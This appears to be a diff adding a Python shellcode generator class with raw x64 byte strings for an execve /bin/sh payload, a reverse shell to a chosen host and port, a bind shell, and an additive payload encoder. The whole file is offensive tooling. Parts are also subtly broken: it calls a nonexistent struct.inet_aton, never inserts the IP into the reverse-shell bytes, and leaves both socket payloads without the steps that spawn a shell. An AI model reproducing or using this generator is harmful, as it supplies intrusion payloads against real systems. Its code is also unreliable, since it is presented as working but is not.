@@ -1,0 +1,39 @@
+import struct
+
+class ShellGen:
+    def __init__(self, arch="x64"):
+        self.arch = arch
+        
+    def execve(self, cmd="/bin/sh"):
+        if self.arch == "x64":
+            # 27-byte execve shellcode
+            sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
+            sc += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+            return sc
+            
+    def reverse_shell(self, host, port):
+        ip = struct.unpack(">I", struct.inet_aton(host))[0]
+        port = struct.pack(">H", port)
+        
+        sc = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
+        sc += b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x02\x5a\x6a\x29\x58\x0f\x05"
+        sc += b"\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02"
+        sc += b"\x66\xc7\x44\x24\x02" + port + b"\x41\x54\x6a\x10\x5a"
+        sc += b"\x6a\x2a\x58\x0f\x05"
+        return sc
+        
+    def bind_shell(self, port):
+        port = struct.pack(">H", port)
+        
+        sc = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x6a\x01\x5e"
+        sc += b"\x6a\x01\x5f\x6a\x02\x5a\x6a\x29\x58\x0f\x05\x48\x89\xc7"
+        sc += b"\x48\x31\xc0\x6a\x02\x5e\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58"
+        sc += b"\x0f\x05\x48\x31\xc0\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x31"
+        sc += b"\xc0\x48\x89\xe6\x6a\x2b\x58\x0f\x05"
+        return sc
+        
+    def encoder(self, data, key=0x41):
+        encoded = b""
+        for b in data:
+            encoded += bytes([(b + key) & 0xff])
+        return encoded
